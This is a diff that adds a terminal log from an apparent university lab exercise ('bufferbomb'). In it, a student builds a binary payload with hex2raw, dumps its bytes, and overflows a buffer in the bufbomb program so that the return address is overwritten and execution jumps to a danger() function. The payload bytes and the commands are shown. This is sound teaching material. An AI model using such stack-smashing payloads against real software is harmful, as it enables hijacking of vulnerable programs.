@@ -1,0 +1,27 @@
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./hex2raw < stringinvasora.txt 
+@
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./hex2raw < stringinvasora.txt > stringinvasora.bin
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ hexdump -x stringinvasora.bin
+0000000    0000    0000    0000    0000    0000    0000    0000    0000
+*
+0000020    0000    0000    0000    0000    1206    0040    0000    0000
+0000030    000a                                                        
+0000031
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ hexdump -C stringinvasora.bin
+00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000020  00 00 00 00 00 00 00 00  06 12 40 00 00 00 00 00  |..........@.....|
+00000030  0a                                                |.|
+00000031
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./bufbomb 
+buf: 0x7ffca097af10
+skdfjdf
+:-( program reached its normal end!
+@dudafonte ➜ .../INF1018/2026-1/lab12-12.05/bufferbomb (main) $ ./bufbomb < stringinvasora.bin
+buf: 0x7ffeef57eeb0
+
+danger! you called danger()
+
+-> cannot be called without validation!
+Ouch!: You caused a segmentation fault!
+Better luck next time
